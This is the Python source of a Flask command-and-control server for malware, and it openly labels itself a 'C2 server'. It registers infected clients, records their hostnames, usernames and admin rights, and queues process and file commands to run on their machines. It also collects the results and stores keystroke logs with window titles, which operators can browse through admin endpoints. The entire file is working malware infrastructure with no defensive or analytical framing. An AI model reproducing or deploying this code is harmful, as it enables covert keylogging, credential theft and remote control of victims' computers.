from flask import Flask, request, jsonify
import time
import threading
from datetime import datetime
import os
from config import ENCRYPTION_KEY, DATABASE_URL, USE_DATABASE
from encryptor import Encryptor
from protocol import Protocol
from database import DatabaseManager


app = Flask(__name__)

# Initialize database
db = None
if USE_DATABASE:
    try:
        db = DatabaseManager(DATABASE_URL)
        print("[SERVER] Using PostgreSQL/Supabase database")
    except Exception as e:
        print(f"[SERVER] Database connection failed: {e}")
        print("[SERVER] Falling back to in-memory storage")
        db = None
else:
    print("[SERVER] Using in-memory storage (DATABASE disabled)")

# Fallback in-memory storage (used if database is disabled or fails)
clients = {}
pending_commands = {}
command_results = {}
keylogs_storage = {}

encryptor = Encryptor(ENCRYPTION_KEY)


def cleanup_old_clients():
    while True:
        try:
            if db:
                deleted_count = db.delete_inactive_clients(3600)
                if deleted_count > 0:
                    print(f"[CLEANUP] Removed {deleted_count} inactive clients from database")
            else:
                current_time = time.time()
                clients_to_remove = []
                
                for client_id, client_data in clients.items():
                    if current_time - client_data.get('last_seen', 0) > 3600:  # 1 hour
                        clients_to_remove.append(client_id)
                
                for client_id in clients_to_remove:
                    del clients[client_id]
                    print(f"[CLEANUP] Removed inactive client: {client_id}")
        except Exception as e:
            print(f"[CLEANUP] Error: {e}")
        
        time.sleep(30)  # Check every 30 seconds


def cleanup_old_keylogs():
    while True:
        try:
            if db:
                deleted_count = db.delete_old_keylogs(24)
                if deleted_count > 0:
                    print(f"[CLEANUP] Removed {deleted_count} old keylogs from database")
            else:
                current_time = time.time()
                cutoff_time = current_time - (24 * 3600)  # 24 hours
                
                for client_id in list(keylogs_storage.keys()):
                    # Filter old logs
                    keylogs_storage[client_id] = [
                        log for log in keylogs_storage[client_id] 
                        if current_time - datetime.fromisoformat(log['timestamp'].replace('Z', '+00:00')).timestamp() < 24 * 3600
                    ]
                    
                    # Remove empty entries
                    if not keylogs_storage[client_id]:
                        del keylogs_storage[client_id]
            
            print(f"[CLEANUP] Keylogs cleanup completed")
            time.sleep(3600)  # Every hour
        
        except Exception as e:
            print(f"[CLEANUP] Error in keylogs cleanup: {e}")
            time.sleep(300)


# Start cleanup threads
cleanup_thread = threading.Thread(target=cleanup_old_clients, daemon=True)
cleanup_thread.start()

keylog_cleanup_thread = threading.Thread(target=cleanup_old_keylogs, daemon=True)
keylog_cleanup_thread.start()


@app.route('/')
def home():
    return "C2 Server Online - " + datetime.now().isoformat()


@app.route('/register', methods=['POST'])
def register_client():
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            error_msg = Protocol.create_error_message("No encrypted data provided!")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({"data": encrypted_res}), 400
        
        client_data = encryptor.decrypt(encrypted_data)
        if not client_data:
            error_msg = Protocol.create_error_message("Decryption failed")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({"data": encrypted_res}), 400
        
        if client_data.get("type") != Protocol.MSG_REGISTER:
            error_msg = Protocol.create_error_message("Invalid message type for registration")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({"data": encrypted_res}), 400
        
        client_id = client_data.get("client_id")
        system_info = client_data.get("system_info", {})

        if not client_id:
            error_msg = Protocol.create_error_message("No client id in message")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({"data": encrypted_res}), 400
        
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

        if db:
            db.register_client(client_id, system_info, client_ip)
        else:
            clients[client_id] = {
                'system_info': system_info,
                'last_seen': time.time(),
                'first_seen': time.time(),
                'ip': client_ip,
                'checkin_count': clients.get(client_id, {}).get('checkin_count', 0) + 1
            }

        response_data = Protocol.create_success_message("Registered successfully!!!")
        encrypted_response = encryptor.encrypt(response_data)

        return jsonify({"data": encrypted_response})
    
    except Exception as e:
        print(f"REGISTRATION ERROR: {e}")
        error_msg = Protocol.create_error_message(str(e))
        error_res = encryptor.encrypt(error_msg)
        return jsonify({"data": error_res}), 500


@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            error_msg = Protocol.create_error_message("No encrypted data")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({"data": encrypted_res}), 400

        heartbeat_data = encryptor.decrypt(encrypted_data)
        if not heartbeat_data:
            error_msg = Protocol.create_error_message("Decryption failed!")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({"data": encrypted_res}), 400

        if heartbeat_data.get("type") != Protocol.MSG_HEARTBEAT:
            error_msg = Protocol.create_error_message("Invalid message type for heartbeat")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({"data": encrypted_res}), 400

        client_id = heartbeat_data.get('client_id')

        if db:
            client_exists = db.get_client(client_id) is not None
            if client_exists:
                db.update_client_heartbeat(client_id)
        else:
            client_exists = client_id in clients

        if client_id and client_exists:
            if not db:
                clients[client_id]['last_seen'] = time.time()
                clients[client_id]['checkin_count'] = clients[client_id].get('checkin_count', 0) + 1 
            
            res_msg = Protocol.create_success_message()
            encrypted_response = encryptor.encrypt(res_msg)
            return jsonify({"data": encrypted_response})
        else:
            error_msg = Protocol.create_error_message("Client not found!")
            encrypted_response = encryptor.encrypt(error_msg)
            return jsonify({"data": encrypted_response}), 404
    
    except Exception as e:
        error_msg = Protocol.create_error_message(str(e))
        encrypted_res = encryptor.encrypt(error_msg)
        return jsonify({"data": encrypted_res}), 500


@app.route('/admin/clients', methods=['GET'])
def get_clients():
    # Get list of all connected clients with detailed information
    clients_list = []
    current_time = time.time()
    
    if db:
        db_clients = db.get_all_clients()
        for client in db_clients:
            last_seen_timestamp = client['last_seen'].timestamp() if hasattr(client['last_seen'], 'timestamp') else time.time()
            first_seen_timestamp = client['first_seen'].timestamp() if hasattr(client['first_seen'], 'timestamp') else time.time()
            
            clients_list.append({
                "client_id": client['client_id'],
                "ip": client.get('ip'),
                "hostname": client.get('hostname'),
                "os_type": client.get('os_type'),
                "os_version": client.get('os_version'),
                "architecture": client.get('architecture'),
                "cpu_count": client.get('cpu_count'),
                "cpu_model": client.get('cpu_model'),
                "total_ram_gb": round(client.get('total_ram', 0) / (1024**3), 2) if client.get('total_ram') else 0,
                "username": client.get('username'),
                "computer_name": client.get('computer_name'),
                "is_admin": client.get('is_admin', False),
                "system_info": client.get('system_info', {}),
                "first_seen": first_seen_timestamp,
                "last_seen": last_seen_timestamp,
                "online": current_time - last_seen_timestamp < 10,
                "checkin_count": client.get('checkin_count', 0),
                "uptime_seconds": current_time - first_seen_timestamp
            })
    else:
        for client_id, client_data in clients.items():
            last_seen = client_data.get('last_seen', 0)
            clients_list.append({
                "client_id": client_id,
                "system_info": client_data.get('system_info', {}),
                "first_seen": client_data.get('first_seen'),
                "last_seen": last_seen,
                "ip": client_data.get('ip'),
                "online": current_time - last_seen < 10,
                "checkin_count": client_data.get('checkin_count', 0),
                "uptime_seconds": current_time - client_data.get('first_seen', current_time)
            })
    
    print(f"[ADMIN] Returning {len(clients_list)} clients")
    return jsonify({
        "status": "success",
        "clients": clients_list,
        "total_clients": len(clients_list),
        "server_time": datetime.now().isoformat(),
        "using_database": db is not None
    })


@app.route('/admin/status', methods=['GET'])
def server_status():
    current_time = time.time()
    
    if db:
        db_clients = db.get_all_clients()
        total_clients = len(db_clients)
        online_clients = sum(1 for client in db_clients 
                            if hasattr(client['last_seen'], 'timestamp') and 
                            current_time - client['last_seen'].timestamp() < 10)
    else:
        total_clients = len(clients)
        online_clients = sum(1 for client in clients.values() 
                            if current_time - client.get('last_seen', 0) < 10)
    
    return jsonify({
        "status": "online",
        "total_clients": total_clients,
        "online_clients": online_clients,
        "server_time": datetime.now().isoformat(),
        "uptime_seconds": time.time() - app.start_time,
        "using_database": db is not None,
        "database_type": "PostgreSQL/Supabase" if db else "In-Memory"
    })


@app.route("/admin/process/<client_id>", methods=['POST'])
def send_process_command(client_id):
    try:
        command_data = request.json
        action = command_data.get("action")
        data = command_data.get("data", {})
        
        if not action:
            return jsonify({"error": "No action specified"}), 400
        
        if db:
            cmd_id = db.add_pending_command(client_id, action, data)
            command_id = f'cmd_{cmd_id}' if cmd_id else f'cmd_{int(time.time() * 1000)}'
        else:
            command_id = f'cmd_{int(time.time() * 1000)}'
            pending_commands.setdefault(client_id, []).append({
                "command_id": command_id,
                "action": action,
                "data": data,
                "timestamp": time.time()
            })
            
            # Clean old commands per client
            if client_id in pending_commands:
                pending_commands[client_id] = pending_commands[client_id][-10:]
        
        print(f"[PROCESS] Command queued for {client_id}: {action}")
        return jsonify({
            "success": True,
            "command_id": command_id,
            "message": f'Command queued for client {client_id}'
        })
    
    except Exception as e:
        return jsonify({"error": f"failed to queue command: {e}"}), 500


@app.route("/admin/file/<client_id>", methods=["POST"])
def send_file_command(client_id):
    try:
        command_data = request.json
        action = command_data.get('action')
        data = command_data.get("data", {})
        
        if not action:
            return jsonify({"error": "No action specified"}), 400
        
        if db:
            cmd_id = db.add_pending_command(client_id, action, data)
            command_id = f'file_cmd_{cmd_id}' if cmd_id else f'file_cmd_{int(time.time() * 1000)}'
        else:
            command_id = f"file_cmd_{int(time.time() * 1000)}"
            pending_commands.setdefault(client_id, []).append({
                "command_id": command_id,
                "action": action,
                "data": data,
                "timestamp": time.time()
            })
            
            if client_id in pending_commands:
                pending_commands[client_id] = pending_commands[client_id][-10:]
        
        print(f"[FILE] command queued for {client_id}: {action}")
        return jsonify({
            "success": True,
            "command_id": command_id,
            "message": f'File command queued for client {client_id}'
        })
    
    except Exception as e:
        return jsonify({"error": f"failed to queue file command: {e}"}), 500


@app.route("/admin/command_result/<command_id>", methods=['GET'])
def get_command_result(command_id):
    try:
        if db:
            # Extract numeric ID from command_id (e.g., "file_cmd_25" -> 25)
            try:
                parts = command_id.split('_')
                cmd_id = int(parts[-1])
            except:
                cmd_id = None
            
            if cmd_id:
                # Query database for command result
                cursor = db.conn.cursor()
                cursor.execute("""
                    SELECT result_data, status, error_message
                    FROM commands 
                    WHERE id = %s AND status IN ('executed', 'failed')
                """, (cmd_id,))
                result_row = cursor.fetchone()
                cursor.close()
                
                if result_row:
                    if result_row['status'] == 'failed':
                        return jsonify({"success": False, "error": result_row['error_message']}), 500
                    return jsonify({"success": True, "result": result_row['result_data']})
        
        # Fallback to in-memory storage
        result = command_results.get(command_id)
        if result:
            return jsonify({"success": True, "result": result.get('result')})
        else:
            return jsonify({"error": "Result not found or expired"}), 404
    
    except Exception as e:
        print(f"[ERROR] get_command_result({command_id}): {e}")
        import traceback
        traceback.print_exc()
        return jsonify({"error": f'Failed to get result: {e}'}), 500


@app.route("/commands", methods=["POST"])
def get_commands():
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            return jsonify({"error": "No encrypted data"}), 400
        
        client_data = encryptor.decrypt(encrypted_data)
        if not client_data or client_data.get("type") != Protocol.MSG_GET_COMMANDS:
            return jsonify({"error": "Invalid request"}), 400
        
        client_id = client_data.get("client_id")
        if not client_id:
            return jsonify({"error": "No client ID"}), 400
        
        print(f"[SERVER] Client {client_id} requesting commands")
        
        if db:
            db_commands = db.get_pending_commands(client_id)
            commands = [{
                "command_id": f"cmd_{cmd['id']}",
                "action": cmd['command_type'],
                "data": cmd['command_data'],
                "timestamp": cmd['created_at'].timestamp() if hasattr(cmd['created_at'], 'timestamp') else time.time()
            } for cmd in db_commands]
            
            # Mark commands as executed
            for cmd in db_commands:
                db.mark_command_executed(cmd['id'])
        else:
            commands = pending_commands.get(client_id, [])
            if commands:
                pending_commands[client_id] = []
        
        print(f"[SERVER] Found {len(commands)} pending commands for {client_id}")
        
        response_data = {
            "type": "commands",
            "commands": commands
        }
        
        encrypted_response = encryptor.encrypt(response_data)
        return jsonify({"data": encrypted_response})
    
    except Exception as e:
        print(f"[SERVER] Error in /commands: {e}")
        return jsonify({"error": f"Failed to get commands: {e}"}), 500


@app.route("/commands_result", methods=["POST"])
def submit_command_result():
    try:
        print(f"[SERVER] Received command result request")
        encrypted_data = request.json.get("data")
        if not encrypted_data:
            print(f"[SERVER] Error: No encrypted data in command result")
            return jsonify({"error": "No encrypted data"}), 400
        
        print(f"[SERVER] Decrypting command result...")
        client_data = encryptor.decrypt(encrypted_data)
        if not client_data:
            print(f"[SERVER] Error: Failed to decrypt command result")
            return jsonify({"error": "Decryption failed"}), 400
            
        print(f"[SERVER] Decrypted data type: {type(client_data)}")

        if not isinstance(client_data, dict) or client_data.get("type") != "command_result":
            print(f"[SERVER] Error: Invalid message format or type: {type(client_data)}")
            return jsonify({"error": "Invalid request format"}), 400
        
        command_id = client_data.get("command_id")
        result = client_data.get("result")
        
        print(f"[SERVER] Command ID: {command_id}, Result type: {type(result)}")
        
        if command_id and result is not None:
            # Store in database if available
            if db:
                # Extract numeric ID from command_id (e.g., "file_cmd_25" -> 25)
                try:
                    parts = command_id.split('_')
                    cmd_id = int(parts[-1])
                    
                    # Update command result in database
                    success = db.update_command_result(cmd_id, result)
                    print(f"[SERVER] DB update result for {command_id} (ID {cmd_id}): {success}")
                except Exception as e:
                    print(f"[SERVER] Error updating DB for {command_id}: {e}")
            
            # Also store in memory for backwards compatibility
            command_results[command_id] = {
                'result': result,
                'timestamp': time.time(),
                'client_id': client_data.get('client_id')
            }
            
            print(f"[SERVER] Successfully stored result for command {command_id}")
            
            # Cleanup old results
            current_time = time.time()
            expired_keys = [k for k, v in command_results.items() if current_time - v.get('timestamp', current_time) > 3600]
            
            for key in expired_keys:
                command_results.pop(key, None)

            return jsonify({"success": True})
        else:
            print(f"[SERVER] Error: Missing command_id or result")
            return jsonify({"error": "Missing command_id or result"}), 400
    
    except Exception as e:
        print(f"[SERVER] Error in /commands_result: {e}")
        import traceback
        print(f"[SERVER] Traceback: {traceback.format_exc()}")
        return jsonify({"error": f"Failed to submit result: {e}"}), 500


@app.route("/keylog_data", methods=["POST"])
def receive_keylog_data():
    try:
        print(f"[KEYLOG] Received keylog data request")
        encrypted_data = request.json.get("data")
        if not encrypted_data:
            print(f"[KEYLOG] Error: No encrypted data")
            return jsonify({"error": "No encrypted data"}), 400
        
        print(f"[KEYLOG] Decrypting keylog data...")
        keylog_data = encryptor.decrypt(encrypted_data)
        if not keylog_data:
            print(f"[KEYLOG] Error: Failed to decrypt keylog data")
            return jsonify({"error": "Decryption failed"}), 400
            
        print(f"[KEYLOG] Decrypted data type: {keylog_data.get('type')}")

        if not isinstance(keylog_data, dict) or keylog_data.get("type") != "keylog_data":
            print(f"[KEYLOG] Error: Invalid message type: {keylog_data.get('type')}")
            return jsonify({"error": "Invalid keylog data format"}), 400
        
        client_id = keylog_data.get("client_id")
        logs = keylog_data.get("logs", [])
        log_count = keylog_data.get("log_count", 0)
        
        print(f"[KEYLOG] Client: {client_id}, Logs count: {log_count}")
        
        if client_id and logs:
            if db:
                for log in logs:
                    keystroke_value = log.get('keystroke', log.get('key', ''))
                    window_value = log.get('window', log.get('app', 'Unknown'))
                    print(f"[KEYLOG] Storing - keystroke: '{keystroke_value}', window: '{window_value}'")
                    
                    db.store_keylog(
                        client_id, 
                        keystroke_value,
                        {
                            "timestamp": log.get('timestamp'), 
                            "window_title": window_value
                        }
                    )
                db.update_client_heartbeat(client_id)
                total_stored = len(db.get_keylogs(client_id, limit=1000))
            else:
                if client_id not in keylogs_storage:
                    keylogs_storage[client_id] = []
                
                keylogs_storage[client_id].extend(logs)
                
                # Keep only last 1000 logs per client
                if len(keylogs_storage[client_id]) > 1000:
                    keylogs_storage[client_id] = keylogs_storage[client_id][-1000:]
                
                total_stored = len(keylogs_storage[client_id])
                
                # Update client last_seen
                if client_id in clients:
                    clients[client_id]['last_seen'] = time.time()
                    clients[client_id]['checkin_count'] = clients[client_id].get('checkin_count', 0) + 1
            
            print(f"[KEYLOG] ✅ Successfully stored {len(logs)} keylogs for client {client_id}")
            print(f"[KEYLOG] Total logs for {client_id}: {total_stored}")
            
            return jsonify({
                "success": True, 
                "message": f"Received {len(logs)} keylogs",
                "total_stored": total_stored
            })
        else:
            print(f"[KEYLOG] Error: Missing client_id or logs")
            return jsonify({"error": "Missing client_id or logs"}), 400
    
    except Exception as e:
        print(f"[KEYLOG] Error in /keylog_data: {e}")
        import traceback
        print(f"[KEYLOG] Traceback: {traceback.format_exc()}")
        return jsonify({"error": f"Failed to process keylogs: {e}"}), 500


@app.route("/admin/keylogs/<client_id>", methods=["GET"])
def get_client_keylogs(client_id):
    try:
        limit = request.args.get('limit', 100, type=int)
        
        if db:
            db_logs = db.get_keylogs(client_id, limit)
            print(f"[KEYLOG] Retrieved {len(db_logs)} logs from DB")
            if db_logs:
                print(f"[KEYLOG] Sample log: {db_logs[0]}")
            
            logs = [{
                "keystroke": log['keystrokes'],
                "timestamp": log['timestamp'].isoformat() if hasattr(log['timestamp'], 'isoformat') else str(log['timestamp']),
                "window": log.get('metadata', {}).get('window_title', log.get('metadata', {}).get('app', 'Unknown'))
            } for log in db_logs]
            total_logs = len(db_logs)
        else:
            if client_id in keylogs_storage:
                logs = keylogs_storage[client_id][-limit:]
                total_logs = len(keylogs_storage[client_id])
            else:
                logs = []
                total_logs = 0
        
        return jsonify({
            "success": True,
            "client_id": client_id,
            "keylogs": logs,
            "total_logs": total_logs,
            "returned_logs": len(logs),
            "message": "No keylogs found for this client" if total_logs == 0 else None
        })
    
    except Exception as e:
        print(f"[ADMIN_KEYLOG] Error getting keylogs for {client_id}: {e}")
        return jsonify({"error": f"Failed to get keylogs: {e}"}), 500


@app.route("/admin/keylogs_stats", methods=["GET"])
def get_keylogs_stats():
    try:
        stats = {}
        total_logs = 0
        current_time = time.time()
        
        if db:
            db_clients = db.get_all_clients()
            for client in db_clients:
                client_id = client['client_id']
                logs = db.get_keylogs(client_id, limit=10000)
                log_count = len(logs)
                
                if log_count > 0:
                    stats[client_id] = {
                        "log_count": log_count,
                        "last_log_time": logs[0]['timestamp'].isoformat() if hasattr(logs[0]['timestamp'], 'isoformat') else str(logs[0]['timestamp']),
                        "client_online": current_time - client['last_seen'].timestamp() < 60 if hasattr(client['last_seen'], 'timestamp') else False
                    }
                    total_logs += log_count
        else:
            for client_id, logs in keylogs_storage.items():
                stats[client_id] = {
                    "log_count": len(logs),
                    "last_log_time": logs[-1]['timestamp'] if logs else "No logs",
                    "client_online": client_id in clients and (current_time - clients[client_id].get('last_seen', 0) < 60)
                }
                total_logs += len(logs)
        
        return jsonify({
            "success": True,
            "total_clients_with_logs": len(stats),
            "total_logs_stored": total_logs,
            "clients": stats
        })
    
    except Exception as e:
        return jsonify({"error": f"Failed to get keylog stats: {e}"}), 500


@app.before_request
def before_request():
    print(f"[REQUEST] {request.method} {request.path} - Clients: {len(clients)}")


@app.after_request
def after_request(response):
    print(f"[RESPONSE] {request.method} {request.path} - Status: {response.status_code}")
    return response


# Store server start time
app.start_time = time.time()


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"[SERVER] Starting C2 server on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)
